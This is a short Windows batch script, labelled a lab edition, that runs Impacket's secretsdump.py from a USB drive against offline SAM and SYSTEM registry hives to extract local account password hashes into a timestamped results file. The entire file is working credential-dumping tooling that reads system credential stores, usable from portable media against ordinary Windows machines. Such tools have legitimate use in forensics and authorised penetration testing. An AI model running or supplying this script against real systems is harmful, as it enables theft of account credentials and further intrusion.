@echo off
setlocal ENABLEDELAYEDEXPANSION
:: ===========================================================
:: process_hives_windows.bat
:: Lab Edition - Processes offline SAM + SYSTEM hives with Impacket
:: Requires:
::   - Portable Python extracted to E:\Python\
::   - Impacket repo in E:\impacket\
::   - SAM & SYSTEM copied offline into E:\hives\<Label>\
:: ===========================================================

set ROOT=%~d0
set PY=%ROOT%\Python\python.exe
set IMPKT=%ROOT%\impacket\examples\secretsdump.py
set HIVES=%ROOT%\hives
set RES=%ROOT%\results

:: Check Python
if not exist "%PY%" (
  echo [!] Portable Python not found at %PY%
  echo     Run WinPython.exe on this USB and extract to \Python\
  pause
  exit /b 1
)

:: Check Impacket
if not exist "%IMPKT%" (
  echo [!] secretsdump.py not found at %IMPKT%
  echo     Ensure the impacket repo is cloned into \impacket\
  pause
  exit /b 1
)

:: Get target label
set LABEL=
set /p LABEL=Enter Target Label (e.g., WIN10LAB):
if "%LABEL%"=="" set LABEL=LABCASE

set TH=%HIVES%\%LABEL%
set TR=%RES%\%LABEL%
if not exist "%TR%" mkdir "%TR%"

:: Check hives
if not exist "%TH%\SAM" (
  echo [!] Missing %TH%\SAM
  pause
  exit /b 1
)
if not exist "%TH%\SYSTEM" (
  echo [!] Missing %TH%\SYSTEM
  pause
  exit /b 1
)

:: Timestamp
for /f %%A in ('powershell -NoProfile -Command "(Get-Date).ToString(\"yyyyMMdd-HHmmss\")"') do set TS=%%A
set OUT=%TR%\%LABEL%_%TS%_offline.txt

:: Run secretsdump
echo.
echo [*] Running secretsdump (offline) for label "%LABEL%"...
"%PY%" "%IMPKT%" -sam "%TH%\SAM" -system "%TH%\SYSTEM" LOCAL > "%OUT%"

if errorlevel 1 (
  echo [!] secretsdump failed. Check dependencies.
) else (
  echo [+] Success! Results saved: %OUT%
)
echo.
pause
